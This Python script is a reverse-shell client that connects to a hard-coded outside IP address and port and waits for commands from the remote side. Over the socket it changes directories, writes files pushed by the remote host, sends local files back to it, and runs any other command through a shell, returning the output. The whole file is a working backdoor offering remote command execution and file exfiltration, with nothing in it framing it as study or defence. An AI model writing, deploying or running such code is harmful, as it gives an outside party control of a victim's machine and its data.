from datetime import datetime
import json
import os
import socket 
import subprocess
import time
from typing import List
from filecode_class import Filecode

def main():
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect(("26.3.92.50", 9990))
    print("Success connect")

    
    while True:
        command = client_socket.recv(1024).decode()
        try:
            if "cd" in command:
                # cd /home/user/test
                list_command :list = on_split(command)
                os.chdir(list_command[1])
                client_socket.send(f"Change directory on {list_command[1]}".encode())
            
            elif "upload" in command:
                # upload test/test.txt test/test1.txt
                list_command :list = on_split(command)
                while len(list_command[3]) != int(list_command[2]):
                    list_command[3] = list_command[3] + client_socket.recv(1024).decode()

                Filecode.on_decode(list_command[1], list_command[3])

                file_list = list_command[1].split("/")
                client_socket.send(f"The file {file_list[-1]} has been sent".encode())
            
            elif "download" in command:
                # download test/test.txt test/test2.txt
                path_in_client :list = on_split(command)
                data = Filecode.on_code(path_in_client[1])
                
                response = str(len(data)) + " "
                client_socket.send(response.encode()+data)

            else:
                ex = subprocess.check_output(command, shell=True).decode()
                if not ex:
                    client_socket.send(b"\n")
                else:
                    client_socket.send(ex.encode())

        except subprocess.CalledProcessError:
            client_socket.send("Not found command\n".encode())

def on_split(line :str):
    result_line :list = line.split(" ")
    return result_line

if __name__ == "__main__":
    main() 